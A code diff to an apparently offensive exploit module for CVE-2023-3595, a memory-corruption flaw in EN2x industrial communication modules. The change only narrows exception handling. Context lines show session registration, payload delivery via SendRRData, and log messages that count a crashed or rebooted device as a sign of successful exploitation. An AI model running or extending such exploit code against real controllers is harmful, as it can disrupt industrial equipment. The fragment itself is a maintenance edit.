@@ -99,7 +99,7 @@ class Exploit(Exploit):
                 return
             session_handle = struct.unpack_from("<I", resp, 4)[0]
             print_success(f"[CVE-2023-3595] Session registered: 0x{session_handle:08X}")
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, OSError) as exc:
             print_error(f"[CVE-2023-3595] Connection failed: {exc}")
             return
 
@@ -158,10 +158,10 @@ class Exploit(Exploit):
                     print_success("[CVE-2023-3595] Payload delivered - check if EN2x rebooted (sign of successful corruption)")
             except TimeoutError:
                 print_success("[CVE-2023-3595] No response after OOB write - EN2x may have crashed/rebooted (exploitation indicator)")
-        except Exception as exc:
+        except OSError as exc:
             print_error(f"[CVE-2023-3595] SendRRData failed: {exc}")
         finally:
             try:
                 sock.close()
-            except Exception:
+            except OSError:
                 pass
